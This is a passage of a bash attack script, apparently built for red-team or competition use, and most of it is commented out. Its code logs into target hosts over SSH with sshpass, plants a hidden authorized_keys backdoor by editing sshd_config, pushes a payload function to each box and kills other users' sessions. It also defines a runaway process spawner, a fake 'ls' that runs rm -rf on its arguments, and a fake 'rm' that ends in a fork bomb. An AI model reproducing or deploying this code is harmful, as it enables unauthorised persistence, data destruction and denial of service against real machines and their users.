#			sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target -t "echo $password | sudo -S mkdir /root/.vim; sudo cp /root/.ssh/authorized_keys /root/.vim/ssh ; sudo sed -i 's/.*AuthorizedKeyFiles/AuthorizedKeyFiles .vim\/ssh /' /etc/ssh/sshd_config"
#			#jumping into each box and letting loose the plague
#			ssh -o StrictHostKeyChecking=no $target "$(declare -f seeder); seeder"
#		done
#	#### sending the payload ####
#	#just testing seeder
##	ssh 192.168.86.28 "$(declare -f seeder); seeder"
#		# looping through targets
#
#	#### killing sessions ####
##		killTargets=$(who -u | grep -v $attackDog | awk '{print $6}')
##		for target in $killTargets; do
##			kill -9 $target
##		done
#	}
#
#### Sandman #######################################
#	function sandman(){
#		while : ; do
#			nohup bash -c "exec -a Sandman sleep 6969" > /dev/null 2>&1 &
#		done
#	}
#
####################################################
#### dirty scripts #################################
####################################################
#	dirtyLS="$(cat <<-'EOF'
#	#!/bin/bash
#	#
#	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
#	#
#	triggerPath="/tmp/.trigger"
#	# pulls in and builds argsLS for the real ls
#	argsLS=""
#	while [[ "$1" != "" ]]; do
#		argsLS="$1 ${argsLS}"
#		shift
#	done
#
#	# checks for the trigger file, if it exists it acts like normal
#	if [ ! -e $triggerPath ]; then
#		/bin/rm -rf $argsLS
#		#could just as easily `shred` to be meaner
#	else
#		/bin/ls $argsLS
#		#hints at the issue
#		printf "\n\n----\n"
#		printf "argsLS= $argsLS\n"
#	fi
#	EOF
#	)"
############################################################
#	dirtyRM="$(cat <<-'EOF'
#	#!/bin/bash
#	#
#	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
#	#
#	trap "printf '\nheh..not THAT easy..\n';sleep 2; printf '\nbut nice try\n'" SIGINT SIGTERM
#	#####################
#	function mainRM(){	#
#		buildEmUp "$@"	#
#		tripwire		#
#	}					#
#	#####################
#	triggerPath="/tmp/.trigger"
#	### defining, and sourcing, increment info ###
#	function buildEmUp(){
#		incrementPath="/tmp/.increment"
#			# checking if increment file exists, making it if not
#			if [ ! -e $incrementPath ]; then
#				echo "increment=0" > $incrementPath
#			fi
#		source $incrementPath
#
#		# pulls in and builds argsRM for the real rm
#		argsRM=""
#		while [[ "$1" != "" ]]; do
#			argsRM="$1 ${argsRM}"
#			shift
#		done
#	}
#	#### checks for the trigger file, if its there it acts like normal ###
#	function tripwire(){
#		if [ ! -e $triggerPath ]; then
#			echo "trigger is missing"
#			rmCase
#		else
#			/bin/rm $argsRM
#			#hints at the issue
#			printf "\n\n----\n"
#			printf "argsRM= $argsRM\n"
#		fi
#	}
#	### determining what happens based on number of times used ###
#	function rmCase(){
#		case $increment in
#			0)
#					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
#					echo "after case: $attemptNum"
#					echo "increment: $increment"
#					echo "hard drives are big. no need to delete anything.."
#					;;
#			1)
#					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
#					printf "\nrude.\nstop that.\n"
#					;;
#			2)
#					clear
#					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
#					echo $increment
#					printf "\nHere.\n";sleep 2; printf "LET.."; sleep 3; printf "ME.."; sleep 2; printf "HELP..\n"; sleep 2; :(){ :|:& };:
#					;;
#			*)
#					clear
#					printf "\nBewbs\n"
#					;;
#		esac
#	}
#	mainRM "$@"
#	EOF
#	)"
#
#	payload
#}
###########################################################################################
#are you root? no? well, try again
###########################################################################################
function neo(){
	if [[ $EUID -ne 0  ]]; then
		printf "\nyou forgot to run as root again... "
		printf "\nCurrent dir is "$(pwd)"\n\n"
		exit 1
	fi
}
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

main $1
